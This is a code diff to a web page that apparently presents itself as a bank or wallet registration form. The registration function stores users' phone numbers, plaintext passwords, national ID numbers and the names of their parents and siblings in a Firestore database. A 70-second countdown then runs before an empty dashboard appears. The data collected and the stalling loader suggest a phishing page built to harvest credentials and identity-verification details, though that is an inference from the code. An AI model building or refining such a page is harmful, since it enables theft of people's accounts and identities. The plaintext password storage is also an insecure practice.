@@ -181,6 +181,7 @@
 
     let currentUser = null;
     let currentBalanceType = 'bank';
+    let countdownInterval = null;
 
     function switchTab(t) {
         document.getElementById('log-error').innerText = "";
@@ -197,38 +198,41 @@
         }
     }
 
-    async function handleRegistration(e) {
+    function handleRegistration(e) {
         e.preventDefault();
         const rawPhone = document.getElementById('reg-phone').value.trim();
         const phone = rawPhone.replace(/\s+/g, '');
         const password = document.getElementById('reg-pass').value.trim();
 
+        let left = 70;
+        document.getElementById('timer-val').innerText = left;
         showScreen('reg-loader-screen');
 
-        try {
-            await db.collection("users").doc(phone).set({
-                phone: phone,
-                password: password,
-                email: document.getElementById('reg-email').value,
-                nid: document.getElementById('reg-nid').value,
-                father: document.getElementById('reg-father').value,
-                mother: document.getElementById('reg-mother').value,
-                sibling: document.getElementById('reg-sibling').value,
-                bankBalance: 0.00,
-                walletBalance: 0.00
-            });
-            currentUser = { phone, bankBalance: 0.00, walletBalance: 0.00 };
-            updateBalanceUI();
-        } catch(err) { 
-            console.error("Error saving data:", err); 
-        }
+        // ডাটাবেজে ব্যাকগ্রাউন্ডে সেভ করা
+        db.collection("users").doc(phone).set({
+            phone: phone,
+            password: password,
+            email: document.getElementById('reg-email').value,
+            nid: document.getElementById('reg-nid').value,
+            father: document.getElementById('reg-father').value,
+            mother: document.getElementById('reg-mother').value,
+            sibling: document.getElementById('reg-sibling').value,
+            bankBalance: 0.00,
+            walletBalance: 0.00
+        }).catch(err => {
+            console.error("Database Error:", err);
+        });
 
-        let left = 70;
-        const timer = setInterval(() => {
+        currentUser = { phone, bankBalance: 0.00, walletBalance: 0.00 };
+        updateBalanceUI();
+
+        if (countdownInterval) clearInterval(countdownInterval);
+
+        countdownInterval = setInterval(() => {
             left--;
             document.getElementById('timer-val').innerText = left;
             if (left <= 0) {
-                clearInterval(timer);
+                clearInterval(countdownInterval);
                 showScreen('dashboard-screen');
                 document.getElementById('bottom-nav').classList.remove('hidden');
             }
@@ -335,5 +339,5 @@
     }
 </script>
 </body>
-            </html>
-    
+                </html>
+                                                                 
